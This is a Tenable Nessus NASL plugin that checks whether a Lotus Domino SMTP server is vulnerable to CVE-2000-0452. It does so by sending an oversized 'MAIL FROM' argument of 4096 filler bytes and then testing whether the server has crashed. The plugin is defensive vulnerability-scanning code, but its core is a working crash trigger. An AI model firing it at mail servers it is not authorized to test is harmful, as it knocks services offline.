#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: "K. K. Mookhey" <cto@nii.co.in>
# To: full-disclosure@lists.netsys.com, vulnwatch@vulnwatch.org,
#  bugtraq@securityfocus.com
# Date: Mon, 11 Nov 2002 13:55:04 +0530
# Subject: Buffer Overflow in iSMTP Gateway
#

include("compat.inc");

if (description)
{
 script_id(10419);
 script_version("$Revision: 1.33 $");
 script_cvs_date("$Date: 2014/05/26 00:51:57 $");

 script_cve_id("CVE-2000-0452");
 script_bugtraq_id(1229);
 script_osvdb_id(321);

 script_name(english:"Lotus Domino SMTP MAIL FROM Command Remote Overflow");
 script_summary(english:"Overflows a buffer in the remote mail server");

 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a remote buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote Lotus Domino SMTP server is affected by a buffer overflow
vulnerability that can be triggered by an overly long argument to the
'MAIL FROM' command.

This problem may allow an attacker to crash the mail server or even
allow the execution of arbitrary code on this system.");
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/smtpkill.pl");
 script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/05/18");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/05/25");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:lotus:domino_enterprise_server");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2000-2014 Tenable Network Security, Inc.");

 script_family(english:"SMTP problems");

 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);


port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


soc = open_sock_tcp(port);
if (! soc) exit(1);

 data = smtp_recv_banner(socket:soc);
 if ( ! data || "Lotus Domino" >!< data ) exit(0);
crp = 'HELO example.com\r\n';
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
if("250 " >< data)
{
 crp = 'MAIL FROM: nessus@' + crap(4096) + '\r\n';
 send(socket:soc, data:crp);
 buf = recv_line(socket:soc, length:1024);
}
 close(soc);

 soc = open_sock_tcp(port);
 if(soc)
 {
 r = smtp_recv_banner(socket:soc);
 }
  else r = 0;
 if(!r)security_hole(port);
